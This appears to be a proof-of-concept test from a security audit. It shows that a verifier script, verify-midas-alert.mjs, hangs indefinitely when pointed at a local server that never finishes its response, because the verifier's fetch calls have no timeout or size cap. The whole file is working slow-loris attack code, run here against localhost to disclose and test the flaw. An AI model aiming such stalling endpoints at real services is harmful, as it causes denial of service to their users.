// PoC 8 — verify-midas-alert.mjs uses fetch() with no timeout and no size cap: a slow-loris endpoint
// (or hostile FRACTALAI_BASE/mirror) hangs the verifier indefinitely (local DoS; fail-closed, never VALID).
import http from 'node:http';
import { spawn } from 'node:child_process';
import { verdict } from './_common.mjs';
const srv = http.createServer((req, res) => { res.writeHead(200, { 'content-type': 'application/json' }); res.write('{'); /* never ends */ }).listen(0, '127.0.0.1');
await new Promise((r) => srv.on('listening', r));
const p = spawn(process.execPath, ['../verifier/verify-midas-alert.mjs', 'ab'.repeat(32)], { env: { ...process.env, FRACTALAI_BASE: `http://127.0.0.1:${srv.address().port}` }, cwd: new URL('.', import.meta.url).pathname });
const LIMIT = Number(process.env.HANG_MS || 25000);
const t = Date.now();
const code = await new Promise((r) => { const k = setTimeout(() => { p.kill(); r('KILLED'); }, LIMIT); p.on('close', (c) => { clearTimeout(k); r(c); }); });
srv.closeAllConnections?.(); srv.close();
const vuln = verdict(code === 'KILLED', `verifier still running after ${Date.now() - t} ms against a stalled endpoint (exit=${code})`);
process.exit(vuln ? 1 : 0);
